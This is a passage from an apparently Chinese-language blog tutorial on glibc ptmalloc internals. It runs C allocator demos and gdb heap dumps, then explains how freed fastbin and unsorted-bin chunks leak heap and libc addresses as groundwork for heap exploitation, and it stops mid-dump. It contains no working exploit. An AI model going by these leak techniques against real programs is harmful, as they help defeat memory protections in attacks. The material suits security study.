class="built_in">malloc</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(m3);</span><br><span class="line">    <span class="type">void</span> *m5 = <span class="built_in">malloc</span>(<span class="number">80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m1, %p\n&quot;</span>,m1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m2, %p\n&quot;</span>,m2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m3, %p\n&quot;</span>,m3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m4, %p\n&quot;</span>,m4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m5, %p\n&quot;</span>,m5);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// result:</span></span><br><span class="line">λ : gcc -g -o test5 test5.c &amp;&amp; ./test5</span><br><span class="line">m1, <span class="number">0x8b1010</span></span><br><span class="line">m2, <span class="number">0x8b1210</span></span><br><span class="line">m3, <span class="number">0x8b1260</span></span><br><span class="line">m4, <span class="number">0x8b1210</span></span><br><span class="line">m5, <span class="number">0x8b1260</span></span><br></pre></td></tr></table></figure><h2 id="下面的例子表明-small-bin-在释放后会相邻合并的例子"><a href="#下面的例子表明-small-bin-在释放后会相邻合并的例子" class="headerlink" title="下面的例子表明 small bin 在释放后会相邻合并的例子."></a>下面的例子表明 small bin 在释放后会相邻合并的例子.</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *m1 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="type">void</span> * ms[<span class="number">200</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(t = <span class="number">0</span>; t &lt; <span class="number">200</span>; t++)</span><br><span class="line">    ms[t] = <span class="built_in">malloc</span>(<span class="number">121</span>); <span class="comment">// small bin size</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(t = <span class="number">0</span>; t &lt; <span class="number">200</span>; t++)</span><br><span class="line">    <span class="built_in">free</span>(ms[t]);</span><br><span class="line">  <span class="type">void</span> *m2 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,m1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,m2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// result:</span></span><br><span class="line">λ : gcc -g -o test2 test2.c &amp;&amp; ./test2</span><br><span class="line"><span class="number">0xeab010</span></span><br><span class="line"><span class="number">0xeab030</span></span><br></pre></td></tr></table></figure><h2 id="举例说明-malloc-consolidate-的作用-以及如何触发-malloc-consolidate"><a href="#举例说明-malloc-consolidate-的作用-以及如何触发-malloc-consolidate" class="headerlink" title="举例说明 malloc_consolidate 的作用, 以及如何触发 malloc_consolidate."></a>举例说明 malloc_consolidate 的作用, 以及如何触发 malloc_consolidate.</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">void</span> *m0 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">        <span class="type">void</span> *m1 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">        <span class="type">void</span> *m2 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        <span class="type">void</span> *m3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">        <span class="type">void</span> *m4 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">        <span class="type">void</span> *m5 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">121</span>);</span><br><span class="line">        <span class="built_in">free</span>(m0);</span><br><span class="line">        <span class="built_in">free</span>(m1);</span><br><span class="line">        <span class="built_in">free</span>(m2);</span><br><span class="line">        <span class="built_in">free</span>(m3);</span><br><span class="line">        <span class="built_in">free</span>(m4);</span><br><span class="line">        <span class="built_in">free</span>(m5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x350</span>);</span><br><span class="line">        <span class="type">void</span> *m6 = <span class="built_in">malloc</span>(<span class="number">0x360</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">1210</span>); <span class="comment">// 触发 Fastbins 合并</span></span><br><span class="line">        <span class="type">void</span> *m7 = <span class="built_in">malloc</span>(<span class="number">0x360</span>);</span><br><span class="line">        <span class="type">void</span> *m8 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m0,%p\n&quot;</span>, m0);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m1,%p\n&quot;</span>, m1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m2,%p\n&quot;</span>, m2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m3,%p\n&quot;</span>, m3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m4,%p\n&quot;</span>, m4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m5,%p\n&quot;</span>, m5);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m6,%p\n&quot;</span>, m6);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m7,%p\n&quot;</span>, m7);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;m8,%p\n&quot;</span>, m8);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result:</span><br><span class="line">λ : gcc -g -o test3 test3.c &amp;&amp; ./test3</span><br><span class="line">m0,<span class="number">0x1bf7010</span></span><br><span class="line">m1,<span class="number">0x1bf7030</span></span><br><span class="line">m2,<span class="number">0x1bf7050</span></span><br><span class="line">m3,<span class="number">0x1bf7260</span></span><br><span class="line">m4,<span class="number">0x1bf7370</span></span><br><span class="line">m5,<span class="number">0x1bf7390</span></span><br><span class="line">m6,<span class="number">0x1bf77a0</span></span><br><span class="line">m7,<span class="number">0x1bf7010</span></span><br><span class="line">m8,<span class="number">0x1bf7380</span></span><br></pre></td></tr></table></figure><h2 id="下面举例说明-当-small-bins-和-large-bins-没有找到对应合适-size-的-Bin-需要切割的情况"><a href="#下面举例说明-当-small-bins-和-large-bins-没有找到对应合适-size-的-Bin-需要切割的情况" class="headerlink" title="下面举例说明, 当 small bins 和 large bins 没有找到对应合适 size 的 Bin, 需要切割的情况."></a>下面举例说明, 当 small bins 和 large bins 没有找到对应合适 size 的 Bin, 需要切割的情况.</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * m1 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">121</span>);</span><br><span class="line">    <span class="type">void</span> * m2 = <span class="built_in">malloc</span>(<span class="number">0x401</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">121</span>);</span><br><span class="line">    <span class="built_in">free</span>(m2);</span><br><span class="line">    <span class="type">void</span> * m3 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">free</span>(m1);</span><br><span class="line">    <span class="type">void</span> * m4 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m1, %p\n&quot;</span>, m1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m2, %p\n&quot;</span>, m2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m3, %p\n&quot;</span>, m3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m4, %p\n&quot;</span>, m4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(size_t) = %ld\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result:</span><br><span class="line">λ : gcc -g -o test1 test1.c &amp;&amp; ./test1</span><br><span class="line">m1, <span class="number">0x1a66010</span></span><br><span class="line">m2, <span class="number">0x1a662b0</span></span><br><span class="line">m3, <span class="number">0x1a662b0</span> <span class="comment">//切割 small bins</span></span><br><span class="line">m4, <span class="number">0x1a66010</span> <span class="comment">//切割 large bins</span></span><br><span class="line"><span class="keyword">sizeof</span>(<span class="type">size_t</span>) = <span class="number">8</span></span><br></pre></td></tr></table></figure><h1 id="exploit-在-ptmalloc-中"><a href="#exploit-在-ptmalloc-中" class="headerlink" title="exploit 在 ptmalloc 中"></a>exploit 在 ptmalloc 中</h1><p>首先明确大部分的关注点, 是在 leak infomation 和 aa4bmo.</p><p>对于 leak infomation, 需要所 dump 的地址内存放关键信息, 比如: 释放后的 chunk 的 fd 和 bk.</p><p>对于 aa4bmo, 这一块在另一篇《PWN之堆触发》有完善的介绍和总结.</p><p>下面的一些分析实例会用到 heap 的分析插件, 并且会提到一些具体的实践以对应之前的理论.</p><h1 id="Leak-Information-泄露关键信息"><a href="#Leak-Information-泄露关键信息" class="headerlink" title="Leak Information (泄露关键信息)"></a>Leak Information (泄露关键信息)</h1><p>Q: 什么是关键信息?</p><p>A: libc 地址, heap 地址</p><p>通过 ptmalloc 获得的内存 chunk 在释放后会变成上面提到的几种缓存类型, 这里主要提一下 Fastbins, Bins 能够泄漏什么关键信息.</p><p>分配区 <code>main_arena</code> 是已经初始化静态全局变量存放在 <code>libc.so.6</code> 的 <code>.data</code> 位置, 可以通过 <code>main_arena</code> 泄露 libc 的基址.</p><h2 id="下面是一个关于-Fastbins-的例子-Fastbins-是单向链表-通过-fd-指针进行遍历-每次插入链表头位置-可以通过已经释放的-Fastbin-chunk-的-fd-指针-dump-到-heap-地址"><a href="#下面是一个关于-Fastbins-的例子-Fastbins-是单向链表-通过-fd-指针进行遍历-每次插入链表头位置-可以通过已经释放的-Fastbin-chunk-的-fd-指针-dump-到-heap-地址" class="headerlink" title="下面是一个关于 Fastbins 的例子, Fastbins 是单向链表, 通过 fd 指针进行遍历, 每次插入链表头位置, 可以通过已经释放的 Fastbin chunk 的 fd 指针 dump 到 heap 地址."></a>下面是一个关于 Fastbins 的例子, Fastbins 是单向链表, 通过 fd 指针进行遍历, 每次插入链表头位置, 可以通过已经释放的 Fastbin chunk 的 fd 指针 dump 到 heap 地址.</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>                                                                                                                                                                                                  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>                                                                                                                                                                                                 </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span>                                                                                                                                                                                                 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>                                                                                                                                                                                                        </span><br><span class="line">&#123;                                                                                                                                                                                                                  </span><br><span class="line">    <span class="type">void</span> * m1 = <span class="built_in">malloc</span>(<span class="number">0x80</span><span class="number">-8</span>);                                                                                                                                                                                    </span><br><span class="line">    <span class="type">void</span> * m2 = <span class="built_in">malloc</span>(<span class="number">0x80</span><span class="number">-8</span>);                                                                                                                                                                                    </span><br><span class="line">    <span class="built_in">memset</span>(m1, <span class="number">65</span>, <span class="number">0x80</span><span class="number">-8</span>);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">memset</span>(m2, <span class="number">65</span>, <span class="number">0x80</span><span class="number">-8</span>);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);                                                                                                                                                                                                     </span><br><span class="line">    <span class="built_in">free</span>(m1);                                                                                                                                                                                                      </span><br><span class="line">    <span class="built_in">free</span>(m2);                                                                                                                                                                                                      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m1: %p\n&quot;</span>, m1);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m2: %p\n&quot;</span>, m2);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(size_t): %ld\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));                                                                                                                                                               </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 主分配区</span><br><span class="line">(gdb) P &amp;main_arena </span><br><span class="line">$<span class="number">3</span> = (<span class="keyword">struct</span> malloc_state *) <span class="number">0x7ffff7dd1b20</span> &lt;main_arena&gt;</span><br><span class="line">(gdb) p main_arena </span><br><span class="line">$<span class="number">2</span> = &#123;mutex = <span class="number">0</span>, flags = <span class="number">0</span>, fastbinsY = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x602080</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;, top = <span class="number">0x602120</span>, last_remainder = <span class="number">0x0</span>, bins = &#123;...more... &#125;, binmap = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, next = <span class="number">0x7ffff7dd1b20</span> &lt;main_arena&gt;, next_free = <span class="number">0x0</span>, attached_threads = <span class="number">1</span>, system_mem = <span class="number">135168</span>, max_system_mem = <span class="number">135168</span>&#125;</span><br><span class="line"># 同上</span><br><span class="line">(gdb) heap</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">Arena(s) found:</span><br><span class="line">         arena @ <span class="number">0x7ffff7dd1b20</span></span><br><span class="line"># Fastbins 在释放后, P 标志位不会被清空</span><br><span class="line">(gdb) heap -l</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">          ADDR             SIZE         STATUS</span><br><span class="line">sbrk_base <span class="number">0x602000</span></span><br><span class="line">chunk     <span class="number">0x602000</span>         <span class="number">0x80</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x602080</span>         <span class="number">0x80</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x602100</span>         <span class="number">0x20</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x602120</span>         <span class="number">0x20ee0</span>      (top)</span><br><span class="line">sbrk_end  <span class="number">0x602001</span></span><br><span class="line"># 查看 bins</span><br><span class="line">(gdb) heap -b</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line">fast bin <span class="number">6</span> @ <span class="number">0x602080</span></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x602080</span> - size <span class="number">0x80</span> </span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x602000</span> - size <span class="number">0x80</span> </span><br><span class="line"># 通过观察源码和这里 Fastbins 的顺序应该可以发现 Fastbins 是头插入</span><br><span class="line">(gdb) heap -f</span><br><span class="line">====================================Fastbins====================================</span><br><span class="line"></span><br><span class="line">[ fb <span class="number">0</span> ] <span class="number">0x7ffff7dd1b28</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">1</span> ] <span class="number">0x7ffff7dd1b30</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">2</span> ] <span class="number">0x7ffff7dd1b38</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">3</span> ] <span class="number">0x7ffff7dd1b40</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">4</span> ] <span class="number">0x7ffff7dd1b48</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">5</span> ] <span class="number">0x7ffff7dd1b50</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">6</span> ] <span class="number">0x7ffff7dd1b58</span>  -&gt; [ <span class="number">0x602080</span> ] (<span class="number">128</span>)</span><br><span class="line">                              [ <span class="number">0x602000</span> ] (<span class="number">128</span>)</span><br><span class="line">[ fb <span class="number">7</span> ] <span class="number">0x7ffff7dd1b60</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">8</span> ] <span class="number">0x7ffff7dd1b68</span>  -&gt; [ <span class="number">0x0</span> ] </span><br><span class="line">[ fb <span class="number">9</span> ] <span class="number">0x7ffff7dd1b70</span>  -&gt; [ <span class="number">0x0</span> ]</span><br><span class="line"># Fastbins 是根据 fd 指针进行遍历</span><br><span class="line">(gdb) p *(mchunkptr)<span class="number">0x602080</span></span><br><span class="line">$<span class="number">4</span> = &#123;prev_size = <span class="number">4702111234474983745</span>, size = <span class="number">129</span>, fd = <span class="number">0x602000</span>, bk = <span class="number">0x4141414141414141</span>, fd_nextsize = <span class="number">0x4141414141414141</span>, bk_nextsize = <span class="number">0x4141414141414141</span>&#125;</span><br><span class="line"># 这里 dump 之前 chunk 的内容可以拿到 heap 的地址</span><br><span class="line">(gdb) x/wx <span class="number">0x602090</span></span><br><span class="line"><span class="number">0x602090</span>:       <span class="number">0x00602000</span></span><br></pre></td></tr></table></figure><p>下面是一个关于 Bins 的例子, Bins 是双向环链表, 头插入, 可以通过已经释放的 Bin chunk 泄漏 libc 和 heap 地址.</p><p>这里需要理解一下由<code>malloc(0xB0-8)</code>; 的作用, 以及 Unstored bin 转为 small bins 的过程. 这里如果不清楚可以对应 libc 源码查看上面提到的 <code>_int_malloc()</code>的过程.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>                                                                                                                                                                                                  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>                                                                                                                                                                                                 </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span>                                                                                                                                                                                                 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>                                                                                                                                                                                                        </span><br><span class="line">&#123;                                                                                                                                                                                                                  </span><br><span class="line">    <span class="type">void</span> * m1 = <span class="built_in">malloc</span>(<span class="number">0x90</span><span class="number">-8</span>);                                                                                                                                                                                    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);                                                                                                                                                                                                     </span><br><span class="line">    <span class="type">void</span> * m2 = <span class="built_in">malloc</span>(<span class="number">0x90</span><span class="number">-8</span>);                                                                                                                                                                                    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);                                                                                                                                                                                                     </span><br><span class="line">    <span class="type">void</span> * m3 = <span class="built_in">malloc</span>(<span class="number">0xA0</span><span class="number">-8</span>);                                                                                                                                                                                    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);                                                                                                                                                                                                     </span><br><span class="line">    <span class="built_in">memset</span>(m1, <span class="number">65</span>, <span class="number">0x90</span><span class="number">-8</span>);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">memset</span>(m2, <span class="number">65</span>, <span class="number">0x90</span><span class="number">-8</span>);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">memset</span>(m3, <span class="number">65</span>, <span class="number">0xA0</span><span class="number">-8</span>);                                                                                                                                                                                        </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(m1);                                                                                                                                                                                                      </span><br><span class="line">    <span class="built_in">free</span>(m2);                                                                                                                                                                                                      </span><br><span class="line">    <span class="built_in">free</span>(m3);                                                                                                                                                                                                      </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xB0</span><span class="number">-8</span>);                                                                                                                                                                                                </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m1: %p\n&quot;</span>, m1);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m2: %p\n&quot;</span>, m2);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;m3: %p\n&quot;</span>, m3);                                                                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(size_t): %ld\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));                                                                                                                                                               </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">λ : gdb -q test2</span><br><span class="line">Reading symbols from test2...done.</span><br><span class="line">(gdb) b <span class="number">19</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x4006ac</span>: file test2.c, line <span class="number">19.</span></span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/spiderzz/Desktop/pwn/<span class="built_in">malloc</span>/test2 </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, main () at test2.c:<span class="number">19</span></span><br><span class="line"><span class="number">19</span>          <span class="built_in">malloc</span>(<span class="number">0xB0</span><span class="number">-8</span>);</span><br><span class="line">(gdb) heap</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">Arena(s) found:</span><br><span class="line">         arena @ <span class="number">0x7ffff7dd1b20</span></span><br><span class="line"></span><br><span class="line"># Unsorted bin 是双向环链表, 这里需要观察, 双向环链表的两个端点 chunk 的 FD 和 BK 的地址不同之处, 因为一个在 libc 的空间, 一个在 heap 的空间.</span><br><span class="line">(gdb) heap -l</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">          ADDR             SIZE         STATUS</span><br><span class="line">sbrk_base <span class="number">0x602000</span></span><br><span class="line">chunk     <span class="number">0x602000</span>         <span class="number">0x90</span>         (F) FD <span class="number">0x7ffff7dd1b78</span> BK <span class="number">0x6020b0</span> </span><br><span class="line">chunk     <span class="number">0x602090</span>         <span class="number">0x20</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x6020b0</span>         <span class="number">0x90</span>         (F) FD <span class="number">0x602000</span> BK <span class="number">0x602160</span> </span><br><span class="line">chunk     <span class="number">0x602140</span>         <span class="number">0x20</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x602160</span>         <span class="number">0xa0</span>         (F) FD <span class="number">0x6020b0</span> BK <span class="number">0x7ffff7dd1b78</span> </span><br><span class="line">chunk     <span class="number">0x602200</span>         <span class="number">0x20</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x602220</span>         <span class="number">0x20de0</span>      (top)</span><br><span class="line">sbrk_end  <span class="number">0x602001</span></span><br><span class="line">(gdb) heap -b</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">unsorted bin @ <span class="number">0x7ffff7dd1b88</span></span><br><span class="line">        <span 